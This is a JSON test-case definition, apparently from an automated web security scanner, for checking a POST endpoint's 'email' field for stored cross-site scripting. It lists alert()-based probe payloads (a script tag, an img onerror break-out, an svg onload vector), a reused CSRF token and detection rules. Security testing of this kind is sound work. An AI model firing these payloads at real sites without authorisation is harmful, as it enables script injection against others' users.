    {
      "id": "tc-POST-14-email-xss-stored",
      "hypothesis_id": "POST 14 email XSS-stored",
      "base_url": "https://",
      "method": "POST",
      "endpoint": "14",
      "parameter": "email",
      "payloads": [
        {
          "tier": "benign",
          "payloads": [
            {
              "location": "body",
              "value": "mail@example.com"
            },
            {
              "location": "body",
              "value": "sRlHA2cQXlSVetz3ApxB4TLvIoiRwTpZ"
            }
          ],
          "description": "Baseline valid email with observed csrf",
          "encoding": "json",
          "content_type": "application/json; charset=utf-8",
          "header": []
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "body",
              "value": "xss1+test@example.com<script>alert(1)</script>"
            },
            {
              "location": "body",
              "value": "sRlHA2cQXlSVetz3ApxB4TLvIoiRwTpZ"
            }
          ],
          "description": "Attempt script injection in email",
          "encoding": "json",
          "content_type": "application/json; charset=utf-8",
          "header": []
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "body",
              "value": "\"><img src=x onerror=alert(2)>@example.com"
            },
            {
              "location": "body",
              "value": "sRlHA2cQXlSVetz3ApxB4TLvIoiRwTpZ"
            }
          ],
          "description": "Attribute break-out vector",
          "encoding": "json",
          "content_type": "application/json; charset=utf-8",
          "header": []
        },
        {
          "tier": "probe",
          "payloads": [
            {
              "location": "body",
              "value": "xss3@example.com\"><svg/onload=alert(3)>"
            },
            {
              "location": "body",
              "value": "sRlHA2cQXlSVetz3ApxB4TLvIoiRwTpZ"
            }
          ],
          "description": "SVG onload vector",
          "encoding": "json",
          "content_type": "application/json; charset=utf-8",
          "header": []
        }
      ],
      "prerequisites": [
        {
          "type": "csrf_token",
          "description": "Use observed CSRF token value in body parameter 'csrf'",
          "bind_to": "csrf"
        }
      ],
      "oracle_rules": [
        {
          "signal": "reflected_input",
          "condition": "follow_up_gets_contain_submitted_value('email')",
          "threshold": {},
          "weight": 1.0
        },
        {
          "signal": "response_length_diff",
          "condition": "baseline_vs_others_body_length_diff_pct>=25",
          "threshold": {
            "body_length_delta_pct": 25.0
          },
          "weight": 0.7
        },
        {
          "signal": "error_signature",
          "condition": "response_body_contains_any(['template','sanitize','invalid html','script detected'])",
          "threshold": {},
          "weight": 0.4
        }
      ],
      "pass_logic": "any",
      "safety": {
        "idempotent_required": false,
        "destructive_ok": false,
        "max_requests": 5
      },
      "max_retries": 1,
      "delay_between_requests": 0.3,
      "tags": [
        "xss",
        "stored"
      ],
      "estimated_duration": 5
    },
